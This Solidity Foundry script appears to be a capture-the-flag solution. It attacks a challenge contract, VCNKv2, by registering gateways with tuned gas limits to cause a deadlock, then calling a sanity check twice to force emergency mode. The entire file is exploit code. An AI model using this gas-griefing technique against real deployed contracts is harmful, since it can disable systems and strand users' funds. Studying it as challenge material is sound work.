// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {Script, console2} from "forge-std/Script.sol";
import {VCNKv2} from "src/VCNKv2.sol";

contract Exploit is Script {
    function run(uint256 player_pvk, address target_addr) external {
        address PLAYER_ADDR = vm.addr(player_pvk);
        uint8 CU_STATUS_EMERGENCY = 3;
        VCNKv2 target = VCNKv2(target_addr);

        vm.startBroadcast(PLAYER_ADDR);
        for (uint8 i = 0; i < 5; i++) {
            target.registerGateway{value: 20 ether, gas: 1_150_500}();
            console2.log("[*] registered gateway %s", i);
        }
        
        console2.log("[*] making Kernel register deadlocked gateways...");
        target.infrastructureSanityCheck();
        console2.log("[*] triggering emergency mode...");
        target.infrastructureSanityCheck();

        console2.log("[*] verifying CU status...");
        (uint8 status, uint8 percentage, uint8 id, , ) = target.controlUnit();
        console2.log("[*] win! CU is in emergency mode:", status);
        console2.log("[*] healthyGatewaysPercentage:", percentage);
        console2.log("[*] latestRegisteredGatewayID:", id);
        vm.stopBroadcast();
    }
}
